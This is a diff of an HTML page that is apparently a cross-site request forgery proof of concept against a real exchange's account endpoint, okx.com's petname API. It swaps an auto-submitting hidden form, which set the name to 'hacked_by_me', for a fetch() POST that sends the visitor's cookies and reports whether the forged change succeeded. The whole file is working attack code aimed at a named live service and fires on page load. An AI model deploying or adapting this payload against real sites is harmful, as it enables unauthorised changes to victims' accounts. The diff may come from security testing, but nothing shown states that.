@@ -1,12 +1,24 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <form action="https://www.okx.com/v3/users/im/basic/petname" method="POST">
-      <input type="hidden" name="petname" value="hacked_by_me">
-      <input type="submit" value="Submit CSRF">
-    </form>
     <script>
-      document.forms[0].submit(); // Auto-submit when loaded
+      fetch("https://www.okx.com/v3/users/im/basic/petname", {
+        method: "POST",
+        credentials: "include", // sends cookies
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "petname=csrf_victim"
+      }).then(res => {
+        console.log("Response:", res.status);
+        if (res.ok) {
+          alert("CSRF may have worked!");
+        } else {
+          alert("Blocked by browser or server.");
+        }
+      }).catch(err => {
+        console.error("Request failed:", err);
+      });
     </script>
   </body>
 </html>
